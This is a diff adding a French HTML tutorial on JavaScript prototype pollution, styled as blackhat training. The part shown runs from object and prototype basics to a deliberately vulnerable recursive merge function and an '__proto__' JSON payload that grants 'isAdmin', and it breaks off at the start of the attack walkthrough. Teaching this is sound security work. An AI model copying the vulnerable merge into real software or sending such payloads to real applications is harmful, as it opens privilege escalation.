@@ -1,0 +1,1609 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>[ PROTOTYPE POLLUTION ] — BLACKHAT TRAINING</title>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --black:#000000;--bg:#030604;--bg2:#050a07;--bg3:#081209;
+  --green:#00ff41;--green-dim:#0a3d15;--green-mid:#1aff5c;--green-dark:#003b0f;
+  --red:#ff0040;--red-dim:#3d0011;
+  --amber:#ffb000;--amber-dim:#3d2a00;
+  --cyan:#00e5ff;
+  --white:#c0c0c0;--dim:#3a5a3a;--bright:#e0ffe0;
+  --scanline:rgba(0,255,65,0.015);
+  --font:'Fira Code',monospace;--font2:'Share Tech Mono',monospace;--font3:'IBM Plex Mono',monospace;
+}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--green-dark) var(--black)}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--black)}
+::-webkit-scrollbar-thumb{background:var(--green-dark);border-radius:3px}
+body{font-family:var(--font);background:var(--black);color:var(--green);overflow-x:hidden;line-height:1.8;font-size:14px;cursor:crosshair}
+::selection{background:var(--green);color:var(--black)}
+a{color:var(--green);text-decoration:none}
+
+/* CRT + SCANLINES */
+body::before{content:'';position:fixed;inset:0;z-index:9999;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.15) 2px,rgba(0,0,0,0.15) 4px);
+  mix-blend-mode:multiply}
+body::after{content:'';position:fixed;inset:0;z-index:9998;pointer-events:none;
+  background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,0.65) 100%);
+  mix-blend-mode:multiply}
+
+/* MATRIX RAIN CANVAS */
+#matrix{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:0.12}
+
+/* FLICKER */
+@keyframes flicker{0%,100%{opacity:1}92%{opacity:1}93%{opacity:0.8}94%{opacity:1}96%{opacity:0.9}97%{opacity:1}}
+main{animation:flicker 8s infinite}
+
+/* NAV */
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;padding:0;
+  background:rgba(0,0,0,0.95);border-bottom:1px solid var(--green-dark);font-family:var(--font2)}
+.nav-inner{display:flex;align-items:stretch;height:40px}
+.nav-logo{padding:0 16px;display:flex;align-items:center;background:var(--green);color:var(--black);
+  font-weight:700;font-size:13px;letter-spacing:1px;white-space:nowrap}
+.nav-links{display:flex;align-items:stretch;overflow-x:auto;flex:1}
+.nav-links a{display:flex;align-items:center;padding:0 14px;font-size:11px;letter-spacing:1px;
+  color:var(--dim);border-right:1px solid var(--green-dark);transition:all .2s;text-transform:uppercase;white-space:nowrap}
+.nav-links a:hover,.nav-links a.active{color:var(--green);background:rgba(0,255,65,0.04)}
+.nav-links a.active{box-shadow:inset 0 -2px 0 var(--green)}
+.nav-status{margin-left:auto;display:flex;align-items:center;padding:0 16px;gap:8px;font-size:11px;color:var(--dim)}
+.nav-status .blink{width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 1.5s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-progress{position:absolute;bottom:0;left:0;height:1px;background:var(--green);transition:width .15s;width:0;
+  box-shadow:0 0 8px var(--green)}
+
+/* MAIN */
+main{position:relative;z-index:1;max-width:960px;margin:0 auto;padding:0 20px}
+
+/* BOOT SEQUENCE */
+#boot{position:fixed;inset:0;z-index:10000;background:var(--black);display:flex;align-items:center;
+  justify-content:center;transition:opacity .5s}
+#boot.done{opacity:0;pointer-events:none}
+#boot-text{font-family:var(--font2);font-size:13px;color:var(--green);white-space:pre-wrap;max-width:700px;line-height:1.6}
+
+/* HERO */
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:80px 0 40px}
+.ascii-art{font-family:var(--font2);font-size:clamp(6px,1.2vw,11px);line-height:1.15;color:var(--green);
+  white-space:pre;margin-bottom:32px;text-shadow:0 0 10px rgba(0,255,65,0.4);opacity:0;animation:fadeIn 1s ease 2.5s forwards}
+.hero-meta{font-size:12px;color:var(--dim);margin-bottom:24px;opacity:0;animation:fadeIn .5s ease 3s forwards}
+.hero-meta span{color:var(--green)}
+.hero-desc{font-family:var(--font3);font-size:15px;color:var(--white);max-width:680px;line-height:1.9;
+  opacity:0;animation:fadeIn .5s ease 3.2s forwards}
+.hero-desc strong{color:var(--green)}
+.hero-prompt{margin-top:40px;display:flex;align-items:center;gap:8px;font-size:14px;opacity:0;animation:fadeIn .5s ease 3.4s forwards}
+.hero-prompt .ps1{color:var(--red)}
+.hero-prompt .cmd{color:var(--green)}
+.hero-prompt .cursor{display:inline-block;width:8px;height:16px;background:var(--green);animation:blink 1s step-end infinite}
+@keyframes fadeIn{to{opacity:1}}
+
+/* CHAPTER SYSTEM */
+.chapter{padding:100px 0 60px;opacity:0;transform:translateY(20px);transition:all .6s ease}
+.chapter.visible{opacity:1;transform:none}
+.ch-header{margin-bottom:40px;padding-bottom:20px;border-bottom:1px solid var(--green-dark)}
+.ch-label{font-family:var(--font2);font-size:11px;color:var(--red);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px;
+  display:flex;align-items:center;gap:8px}
+.ch-label::before{content:'>';color:var(--green)}
+.ch-label::after{content:'';flex:1;height:1px;background:var(--green-dark)}
+.ch-title{font-family:var(--font);font-size:clamp(22px,4vw,32px);font-weight:700;color:var(--bright);letter-spacing:-0.5px}
+.ch-title .hl{color:var(--green);text-shadow:0 0 20px rgba(0,255,65,0.3)}
+
+/* TEXT */
+.txt{font-family:var(--font3);color:var(--white);font-size:14px;line-height:2;margin-bottom:20px}
+.txt code{background:rgba(0,255,65,0.08);border:1px solid var(--green-dark);border-radius:3px;
+  padding:1px 7px;font-family:var(--font);font-size:13px;color:var(--green)}
+.txt strong{color:var(--green)}
+.txt em{color:var(--amber);font-style:normal}
+
+/* TERMINAL BLOCKS */
+.terminal{border:1px solid var(--green-dark);border-radius:0;margin:24px 0;overflow:hidden;
+  background:rgba(0,0,0,0.6)}
+.term-bar{display:flex;align-items:center;padding:8px 14px;background:rgba(0,255,65,0.04);
+  border-bottom:1px solid var(--green-dark);gap:10px}
+.term-bar .dots{display:flex;gap:5px}
+.term-bar .dots i{width:8px;height:8px;border-radius:50%;border:1px solid}
+.term-bar .dots i:nth-child(1){border-color:#ff5f57;background:rgba(255,95,87,0.3)}
+.term-bar .dots i:nth-child(2){border-color:#febc2e;background:rgba(254,188,46,0.3)}
+.term-bar .dots i:nth-child(3){border-color:#28c840;background:rgba(40,200,64,0.3)}
+.term-title{font-size:11px;color:var(--dim);font-family:var(--font2)}
+.term-copy{margin-left:auto;background:none;border:1px solid var(--green-dark);color:var(--dim);
+  padding:2px 10px;font-size:10px;font-family:var(--font);cursor:pointer;transition:all .2s;letter-spacing:1px}
+.term-copy:hover{border-color:var(--green);color:var(--green)}
+.term-copy.ok{border-color:var(--green);color:var(--black);background:var(--green)}
+.term-body{padding:20px;overflow-x:auto;font-size:13px;line-height:1.9}
+.term-body pre{white-space:pre-wrap;word-break:break-word}
+
+/* SYNTAX COLORS */
+.k{color:var(--red)}
+.f{color:var(--cyan)}
+.s{color:var(--green)}
+.c{color:#3a5a3a;font-style:italic}
+.n{color:var(--amber)}
+.o{color:#ff6b6b}
+.v{color:var(--white)}
+.p{color:var(--cyan)}
+.d{color:#888}
+
+/* CONCEPT BOXES */
+.concept{border-left:3px solid var(--green);padding:20px 24px;margin:28px 0;
+  background:rgba(0,255,65,0.02)}
+.concept-title{font-size:12px;color:var(--green);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;
+  font-family:var(--font2)}
+.concept p{font-family:var(--font3);color:var(--white);font-size:14px;line-height:1.9}
+
+/* WARNING */
+.warn{border-left:3px solid var(--red);padding:20px 24px;margin:28px 0;
+  background:rgba(255,0,64,0.03)}
+.warn-title{font-size:12px;color:var(--red);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;
+  font-family:var(--font2)}
+.warn p{font-family:var(--font3);color:var(--white);font-size:14px;line-height:1.9}
+
+/* INFO */
+.info{border-left:3px solid var(--amber);padding:20px 24px;margin:28px 0;background:rgba(255,176,0,0.03)}
+.info-title{font-size:12px;color:var(--amber);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;font-family:var(--font2)}
+.info p{font-family:var(--font3);color:var(--white);font-size:14px;line-height:1.9}
+
+/* SCHEMA / DIAGRAM */
+.diagram{font-family:var(--font2);font-size:12px;color:var(--green);white-space:pre;
+  overflow-x:auto;padding:24px;margin:24px 0;background:rgba(0,255,65,0.02);
+  border:1px dashed var(--green-dark);line-height:1.5;text-shadow:0 0 6px rgba(0,255,65,0.2)}
+
+/* TABS */
+.tabs{display:flex;border-bottom:1px solid var(--green-dark);margin-bottom:0}
+.tab-btn{padding:10px 20px;font-family:var(--font);font-size:12px;color:var(--dim);cursor:pointer;
+  background:none;border:none;border-bottom:2px solid transparent;transition:all .2s;letter-spacing:0.5px}
+.tab-btn:hover{color:var(--green)}
+.tab-btn.active{color:var(--green);border-bottom-color:var(--green);background:rgba(0,255,65,0.03)}
+.tab-panel{display:none;padding-top:4px}
+.tab-panel.active{display:block}
+
+/* INTERACTIVE DEMOS */
+.lab{border:1px solid var(--green-dark);margin:32px 0;background:rgba(0,0,0,0.4)}
+.lab-bar{display:flex;align-items:center;padding:10px 16px;background:rgba(0,255,65,0.04);
+  border-bottom:1px solid var(--green-dark);gap:10px}
+.lab-bar .tag{padding:2px 10px;font-size:10px;letter-spacing:2px;text-transform:uppercase;
+  font-family:var(--font2)}
+.lab-bar .tag.live{background:rgba(255,0,64,0.15);color:var(--red);border:1px solid rgba(255,0,64,0.3)}
+.lab-bar .tag.safe{background:rgba(0,255,65,0.08);color:var(--green);border:1px solid var(--green-dark)}
+.lab-bar h4{font-size:13px;color:var(--bright);font-weight:500}
+.lab-body{padding:20px}
+.lab-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.lab-col label{display:block;font-size:11px;color:var(--dim);margin-bottom:8px;letter-spacing:1px;
+  text-transform:uppercase;font-family:var(--font2)}
+.lab-col textarea,.lab-col input[type="text"]{width:100%;background:var(--black);border:1px solid var(--green-dark);
+  padding:14px;color:var(--green);font-family:var(--font);font-size:13px;resize:vertical;
+  line-height:1.7;transition:border-color .2s}
+.lab-col textarea:focus,.lab-col input:focus{outline:none;border-color:var(--green)}
+.lab-output{background:var(--black);border:1px solid var(--green-dark);padding:16px;
+  font-family:var(--font);font-size:13px;min-height:160px;overflow:auto;line-height:1.8;white-space:pre-wrap}
+.lab-run{background:none;border:1px solid var(--green);color:var(--green);padding:8px 20px;
+  font-family:var(--font);font-size:12px;cursor:pointer;transition:all .2s;letter-spacing:1px;margin-top:12px}
+.lab-run:hover{background:var(--green);color:var(--black)}
+
+/* STEPS / PIPELINE */
+.pipeline{display:flex;flex-direction:column;gap:0;margin:28px 0}
+.pipe-step{display:flex;gap:16px;padding:16px 0}
+.pipe-num{width:32px;height:32px;display:flex;align-items:center;justify-content:center;
+  border:1px solid var(--green-dark);font-size:12px;color:var(--green);flex-shrink:0;
+  font-family:var(--font2)}
+.pipe-step.active .pipe-num{background:var(--green);color:var(--black);border-color:var(--green)}
+.pipe-line{width:1px;background:var(--green-dark);margin:0 0 0 15px;min-height:12px}
+.pipe-content h4{font-size:15px;color:var(--bright);font-weight:600;margin-bottom:6px}
+.pipe-content p{color:var(--white);font-family:var(--font3);font-size:13px;line-height:1.8}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;margin:24px 0;font-size:13px}
+table th{text-align:left;padding:10px 14px;border-bottom:2px solid var(--green-dark);
+  color:var(--green);font-size:11px;letter-spacing:1px;text-transform:uppercase;font-family:var(--font2)}
+table td{padding:10px 14px;border-bottom:1px solid rgba(0,255,65,0.06);color:var(--white);font-family:var(--font3)}
+table tr:hover td{background:rgba(0,255,65,0.02)}
+.sev{padding:2px 8px;font-size:10px;font-family:var(--font);letter-spacing:1px}
+.sev.crit{color:var(--red);border:1px solid rgba(255,0,64,0.3);background:rgba(255,0,64,0.08)}
+.sev.high{color:var(--amber);border:1px solid rgba(255,176,0,0.3);background:rgba(255,176,0,0.08)}
+
+/* FOOTER */
+footer{padding:60px 0;text-align:center;border-top:1px solid var(--green-dark);margin-top:80px}
+footer pre{font-family:var(--font2);font-size:10px;color:var(--dim);line-height:1.4}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+  .lab-grid{grid-template-columns:1fr}
+  .nav-status{display:none}
+  .nav-links a{padding:0 10px;font-size:10px}
+  .ascii-art{font-size:5px!important}
+  .diagram{font-size:10px}
+}
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<!-- BOOT SEQUENCE -->
+<div id="boot"><div id="boot-text"></div></div>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-inner">
+    <div class="nav-logo">[ PROTO::POLLUTE ]</div>
+    <div class="nav-links">
+      <a href="#ch0" class="active">00:BASES</a>
+      <a href="#ch1">01:PROTO</a>
+      <a href="#ch2">02:VULN</a>
+      <a href="#ch3">03:EXPLOIT_JS</a>
+      <a href="#ch4">04:EXPLOIT_PY</a>
+      <a href="#ch5">05:AVANCÉ</a>
+      <a href="#ch6">06:LAB</a>
+      <a href="#ch7">07:DÉFENSE</a>
+    </div>
+    <div class="nav-status"><div class="blink"></div>RECORDING</div>
+  </div>
+  <div class="nav-progress" id="navProgress"></div>
+</nav>
+
+<main>
+
+<!-- ===== HERO ===== -->
+<section class="hero" id="hero">
+<pre class="ascii-art">
+ ██▓███   ██▀███   ▒█████  ▄▄▄█████▓ ▒█████  ▄▄▄█████▓▓██   ██▓ ██▓███  ▓█████
+▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▒██▒  ██▒▓  ██▒ ▓▒ ▒██  ██▒▓██░  ██▒▓█   ▀
+▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██░  ██▒▒ ▓██░ ▒░  ▒██ ██░▓██░ ██▓▒▒███
+▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ▒██   ██░░ ▓██▓ ░   ░ ▐██▓░▒██▄█▓▒ ▒▒▓█  ▄
+▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░ ████▓▒░  ▒██▒ ░   ░ ██▒▓░▒██▒ ░  ░░▒████▒
+        ██▓███   ▒█████   ██▓     ██▓     █    ██ ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
+       ▓██░  ██▒▒██▒  ██▒▓██▒    ▓██▒     ██  ▓██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
+       ▓██░ ██▓▒▒██░  ██▒▒██░    ▒██░    ▓██  ▒██░▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
+       ▒██▄█▓▒ ▒▒██   ██░▒██░    ▒██░    ▓▓█  ░██░░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
+       ▒██▒ ░  ░░ ████▓▒░░██████▒░██████▒▒▒█████▓   ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
+</pre>
+
+<div class="hero-meta">
+  <span>[CLASSIFICATION: RESTRICTED]</span> &nbsp;—&nbsp; VERSION 2.0 &nbsp;—&nbsp; UPDATED: 2025 &nbsp;—&nbsp; <span>MODULES: 8</span>
+</div>
+
+<p class="hero-desc">
+  Formation complète sur la <strong>Prototype Pollution</strong> — de la compréhension des objets et prototypes en JavaScript jusqu'à l'exploitation avancée incluant RCE, auth bypass et class pollution Python. Chaque concept est construit sur le précédent. <strong>Aucun prérequis avancé nécessaire.</strong>
+</p>
+
+<div class="hero-prompt">
+  <span class="ps1">root@blackhat</span>:<span class="cmd">~# ./start_training.sh --level=0 --deep</span><span class="cursor"></span>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 0 : LES BASES ===== -->
+<section class="chapter" id="ch0">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 00 — FONDAMENTAUX</div>
+  <h2 class="ch-title">Les <span class="hl">objets</span> en JavaScript</h2>
+</div>
+
+<p class="txt">
+  Avant de parler de pollution, il faut d'abord comprendre ce qu'est un <strong>objet</strong> en JavaScript. Tout commence là.
+</p>
+
+<div class="concept">
+  <div class="concept-title">📦 Qu'est-ce qu'un objet ?</div>
+  <p>Un objet est un <strong>conteneur de données</strong> organisé en paires clé-valeur. C'est la structure de base la plus utilisée en JavaScript. Presque tout en JS est un objet : les tableaux, les fonctions, les dates, les regex...</p>
+</div>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">bases-objet.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// Créer un objet simple</span>
+<span class="k">const</span> <span class="v">user</span> <span class="o">=</span> {
+  <span class="p">name</span>: <span class="s">"Alice"</span>,
+  <span class="p">age</span>: <span class="n">25</span>,
+  <span class="p">role</span>: <span class="s">"developer"</span>
+};
+
+<span class="c">// Accéder aux propriétés</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">user</span>.<span class="p">name</span>);        <span class="c">// "Alice"</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">user</span>[<span class="s">"role"</span>]);     <span class="c">// "developer"</span>
+
+<span class="c">// Ajouter dynamiquement une propriété</span>
+<span class="v">user</span>.<span class="p">email</span> <span class="o">=</span> <span class="s">"alice@mail.com"</span>;
+
+<span class="c">// Supprimer une propriété</span>
+<span class="k">delete</span> <span class="v">user</span>.<span class="p">age</span>;
+
+<span class="c">// Itérer sur les clés</span>
+<span class="k">for</span> (<span class="k">let</span> <span class="v">key</span> <span class="k">in</span> <span class="v">user</span>) {
+  <span class="v">console</span>.<span class="f">log</span>(<span class="v">key</span>, <span class="s">"→"</span>, <span class="v">user</span>[<span class="v">key</span>]);
+}
+<span class="c">// name → Alice</span>
+<span class="c">// role → developer</span>
+<span class="c">// email → alice@mail.com</span></pre></div>
+</div>
+
+<p class="txt">
+  Le point crucial : en JS, quand vous accédez à une propriété qui <em>n'existe pas</em> sur un objet, JavaScript ne s'arrête pas là. Il va <strong>chercher plus haut dans la chaîne</strong>. C'est ici que la magie (et le danger) commence.
+</p>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">propriete-absente.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="k">const</span> <span class="v">obj</span> <span class="o">=</span> { <span class="p">a</span>: <span class="n">1</span> };
+
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">obj</span>.<span class="p">a</span>);           <span class="c">// 1        ← existe sur l'objet</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">obj</span>.<span class="p">b</span>);           <span class="c">// undefined ← n'existe nulle part</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">obj</span>.<span class="f">toString</span>());  <span class="c">// "[object Object]"</span>
+<span class="c">// ↑ MAIS ATTENDEZ... on n'a jamais défini toString() !</span>
+<span class="c">// D'où vient cette méthode ? → Du PROTOTYPE.</span></pre></div>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 1 : PROTOTYPES ===== -->
+<section class="chapter" id="ch1">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 01 — LE PROTOTYPE</div>
+  <h2 class="ch-title">La chaîne <span class="hl">prototypale</span></h2>
+</div>
+
+<p class="txt">
+  JavaScript utilise un système d'<strong>héritage prototypal</strong> (et non classique comme Java/C++). Chaque objet possède un lien interne vers un autre objet appelé son <strong>prototype</strong>. Quand on accède à une propriété, JS la cherche d'abord sur l'objet, puis remonte la chaîne des prototypes.
+</p>
+
+<div class="diagram">
+┌──────────────────────────┐
+│       votre objet        │
+│  { name: "Alice" }       │
+│                          │
+│  __proto__ ──────────────┼──┐
+└──────────────────────────┘  │
+                              ▼
+┌──────────────────────────────────────┐
+│        Object.prototype             │
+│  toString(), hasOwnProperty(),      │
+│  valueOf(), constructor, ...        │
+│                                      │
+│  __proto__ ──────────────────────────┼──┐
+└──────────────────────────────────────┘  │
+                                          ▼
+                                        null
+                                    (fin de chaîne)
+</div>
+
+<div class="concept">
+  <div class="concept-title">🔗 Règle fondamentale</div>
+  <p>Quand vous faites <code>obj.propriété</code>, JavaScript exécute cet algorithme :<br>
+  1. Est-ce que <code>obj</code> a directement cette propriété ? → Si oui, retourne la valeur.<br>
+  2. Sinon, est-ce que <code>obj.__proto__</code> l'a ? → Si oui, retourne la valeur.<br>
+  3. Sinon, est-ce que <code>obj.__proto__.__proto__</code> l'a ? → Continue à remonter...<br>
+  4. Si on arrive à <code>null</code> → retourne <code>undefined</code>.</p>
+</div>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">prototype-demo.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="k">const</span> <span class="v">animal</span> <span class="o">=</span> { <span class="p">type</span>: <span class="s">"unknown"</span>, <span class="f">speak</span>() { <span class="k">return</span> <span class="s">"..."</span>; } };
+<span class="k">const</span> <span class="v">dog</span> <span class="o">=</span> <span class="v">Object</span>.<span class="f">create</span>(<span class="v">animal</span>);  <span class="c">// dog hérite de animal</span>
+<span class="v">dog</span>.<span class="p">name</span> <span class="o">=</span> <span class="s">"Rex"</span>;
+
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">dog</span>.<span class="p">name</span>);    <span class="c">// "Rex"     ← propre à dog</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">dog</span>.<span class="p">type</span>);    <span class="c">// "unknown" ← hérité de animal</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">dog</span>.<span class="f">speak</span>()); <span class="c">// "..."     ← hérité de animal</span>
+
+<span class="c">// Vérifier la chaîne</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">dog</span>.<span class="p">__proto__</span> <span class="o">===</span> <span class="v">animal</span>);                 <span class="c">// true</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">dog</span>.<span class="p">__proto__</span>.<span class="p">__proto__</span> <span class="o">===</span> <span class="v">Object</span>.<span class="p">prototype</span>); <span class="c">// true</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">dog</span>.<span class="p">__proto__</span>.<span class="p">__proto__</span>.<span class="p">__proto__</span>);             <span class="c">// null</span></pre></div>
+</div>
+
+<p class="txt">
+  Il y a 3 façons d'accéder au prototype d'un objet, et c'est important pour comprendre les vecteurs d'attaque :
+</p>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">acces-prototype.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="k">const</span> <span class="v">obj</span> <span class="o">=</span> {};
+
+<span class="c">// Méthode 1 : __proto__ (non-standard mais universellement supporté)</span>
+<span class="v">obj</span>.<span class="p">__proto__</span>                     <span class="c">// → Object.prototype</span>
+
+<span class="c">// Méthode 2 : Object.getPrototypeOf() (standard ES5+)</span>
+<span class="v">Object</span>.<span class="f">getPrototypeOf</span>(<span class="v">obj</span>)       <span class="c">// → Object.prototype</span>
+
+<span class="c">// Méthode 3 : via constructor</span>
+<span class="v">obj</span>.<span class="p">constructor</span>.<span class="p">prototype</span>        <span class="c">// → Object.prototype</span>
+
+<span class="c">// Les 3 pointent vers le même objet !</span>
+<span class="v">obj</span>.<span class="p">__proto__</span> <span class="o">===</span> <span class="v">obj</span>.<span class="p">constructor</span>.<span class="p">prototype</span>  <span class="c">// true</span></pre></div>
+</div>
+
+<div class="info">
+  <div class="info-title">💡 __proto__ vs prototype</div>
+  <p>Ne confondez pas les deux : <code>__proto__</code> est une propriété de chaque <strong>instance</strong> (le lien vers son prototype). <code>prototype</code> est une propriété des <strong>fonctions constructeur</strong> (le modèle pour les futures instances). Quand vous faites <code>new Foo()</code>, l'objet créé aura <code>__proto__ === Foo.prototype</code>.</p>
+</div>
+
+<p class="txt">
+  Et voici le point crucial : <code>Object.prototype</code> est <strong>partagé par TOUS les objets</strong> créés avec <code>{}</code> ou <code>new Object()</code>. Si vous modifiez <code>Object.prototype</code>, vous modifiez <em>le comportement de tous les objets de votre application</em>.
+</p>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">pollution-basique.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// AVANT la pollution</span>
+<span class="k">const</span> <span class="v">a</span> <span class="o">=</span> {};
+<span class="k">const</span> <span class="v">b</span> <span class="o">=</span> {};
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">a</span>.<span class="p">hacked</span>);  <span class="c">// undefined</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">b</span>.<span class="p">hacked</span>);  <span class="c">// undefined</span>
+
+<span class="c">// ☠️ On modifie Object.prototype</span>
+<span class="v">Object</span>.<span class="p">prototype</span>.<span class="p">hacked</span> <span class="o">=</span> <span class="s">"pwned"</span>;
+
+<span class="c">// APRÈS la pollution — TOUS les objets sont affectés</span>
+<span class="k">const</span> <span class="v">c</span> <span class="o">=</span> {};
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">a</span>.<span class="p">hacked</span>);  <span class="c">// "pwned" ← existait avant !</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">b</span>.<span class="p">hacked</span>);  <span class="c">// "pwned" ← existait avant !</span>
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">c</span>.<span class="p">hacked</span>);  <span class="c">// "pwned" ← créé après !</span></pre></div>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 2 : LA VULNÉRABILITÉ ===== -->
+<section class="chapter" id="ch2">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 02 — LA VULNÉRABILITÉ</div>
+  <h2 class="ch-title">Comment la <span class="hl">pollution</span> se produit</h2>
+</div>
+
+<p class="txt">
+  Un attaquant ne peut pas directement écrire <code>Object.prototype.x = y</code> dans votre serveur. Il a besoin d'un <strong>vecteur</strong> : une fonction dans votre code qui va involontairement écrire sur le prototype en traitant des données contrôlées par l'attaquant.
+</p>
+
+<div class="concept">
+  <div class="concept-title">🎯 Les 3 conditions nécessaires</div>
+  <p>Pour qu'une prototype pollution soit exploitable, il faut :<br>
+  <strong>1.</strong> Une fonction qui effectue une <strong>assignation récursive</strong> de propriétés (merge, clone, extend, defaultsDeep...)<br>
+  <strong>2.</strong> Cette fonction ne <strong>filtre pas</strong> les clés spéciales (<code>__proto__</code>, <code>constructor</code>, <code>prototype</code>)<br>
+  <strong>3.</strong> L'entrée provient d'une source <strong>contrôlée par l'attaquant</strong> (body HTTP, query params, JSON...)</p>
+</div>
+
+<p class="txt">
+  Regardons la fonction de merge la plus classique et pourquoi elle est vulnérable :
+</p>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">vuln-merge-explained.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// ❌ Fonction de merge vulnérable — très courante dans le code réel</span>
+<span class="k">function</span> <span class="f">merge</span>(<span class="v">target</span>, <span class="v">source</span>) {
+  <span class="k">for</span> (<span class="k">let</span> <span class="v">key</span> <span class="k">in</span> <span class="v">source</span>) {
+    <span class="c">//       ↑ Itère sur TOUTES les clés, y compris "__proto__"</span>
+    <span class="k">if</span> (<span class="k">typeof</span> <span class="v">source</span>[<span class="v">key</span>] <span class="o">===</span> <span class="s">'object'</span> <span class="o">&&</span> <span class="v">source</span>[<span class="v">key</span>] <span class="o">!==</span> <span class="k">null</span>) {
+      <span class="k">if</span> (<span class="k">typeof</span> <span class="v">target</span>[<span class="v">key</span>] <span class="o">!==</span> <span class="s">'object'</span>) {
+        <span class="v">target</span>[<span class="v">key</span>] <span class="o">=</span> {};
+      }
+      <span class="f">merge</span>(<span class="v">target</span>[<span class="v">key</span>], <span class="v">source</span>[<span class="v">key</span>]);
+      <span class="c">//   ↑ Quand key === "__proto__", target[key] === Object.prototype !</span>
+      <span class="c">//     On merge donc DANS le prototype !</span>
+    } <span class="k">else</span> {
+      <span class="v">target</span>[<span class="v">key</span>] <span class="o">=</span> <span class="v">source</span>[<span class="v">key</span>];
+    }
+  }
+}
+
+<span class="c">// Quand l'attaquant envoie ce JSON :</span>
+<span class="k">const</span> <span class="v">malicious</span> <span class="o">=</span> <span class="v">JSON</span>.<span class="f">parse</span>(<span class="s">'{"__proto__": {"isAdmin": true}}'</span>);
+<span class="c">//                                 ↑ JSON.parse crée un objet avec la CLÉ "__proto__"</span>
+<span class="c">//                                   (pas un lien prototypal, une vraie propriété !)</span></pre></div>
+</div>
+
+<p class="txt">
+  Le point subtil : <code>JSON.parse('{"__proto__":{}}')</code> crée un objet où <code>__proto__</code> est une <strong>propriété propre</strong> (own property). Mais quand le code fait <code>target["__proto__"]</code> en lecture, JavaScript interprète ça comme l'accès au <strong>prototype réel</strong>, qui est <code>Object.prototype</code>. C'est cette ambiguïté qui crée la vulnérabilité.
+</p>
+
+<p class="txt">
+  Voici le déroulement pas à pas de l'attaque :
+</p>
+
+<div class="pipeline">
+  <div class="pipe-step active">
+    <div class="pipe-num">01</div>
+    <div class="pipe-content">
+      <h4>L'attaquant envoie un payload</h4>
